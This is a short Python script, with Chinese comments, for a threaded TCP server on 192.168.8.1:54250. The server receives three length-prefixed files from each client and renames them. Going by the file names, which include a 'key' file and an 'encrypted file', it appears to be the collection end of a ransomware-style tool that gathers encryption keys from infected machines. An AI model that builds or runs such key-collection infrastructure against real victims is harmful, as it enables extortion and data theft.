#-*- coding=utf-8 -*-

import socket
import time
import threading
import os
import struct

class RE_CEIVE():
    def __init__(self):
        self.listen_ip = "192.168.8.1"
        self.listen_port = 54250
        self.so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.key_name = ["123asabns_key","dhdksjhd被加密的文件.txt","dhaskjdhkjsahd.txt"]
    def __bl_socket(self):
        #ipv4模式tcp协议
        self.so.bind((self.listen_ip,self.listen_port))
        self.so.listen(20)

    def __receive_file(self,cl_sock,addr):

        for name in self.key_name:
            # 接收数据长度,首先接收4个字节长度的数据,因为这个4个字节是长度
            cl_res_len = cl_sock.recv(4)
            msg_len = struct.unpack('i', cl_res_len)[0]
            # 通过解包出来的长度,来接收后面的真实数据
            buf = cl_sock.recv(msg_len)
            if buf:
                key_file = open(name, 'wb')
                key_file.write(buf)
                key_file.close()

        self.__rename()
        print("downloaded key_file ok from %s:%s" % addr)


    def __rename(self):
        with open(self.key_name[2],"r") as file_name:
            file_name = file_name.readline()
            print(file_name)
            os.rename(self.key_name[0],file_name + "_key")
            os.rename(self.key_name[1],file_name +"_被加密的文件.txt")
        os.remove(self.key_name[2])
    def run(self):
        #绑定本机ip进行监听
        self.__bl_socket()

        while True:
            # 接收连接过来的地址
            cl_sock,addr = self.so.accept()
            th = threading.Thread(target=self.__receive_file,args=(cl_sock,addr))
            th.start()


if __name__ == '__main__':
    receive = RE_CEIVE()
    receive.run()






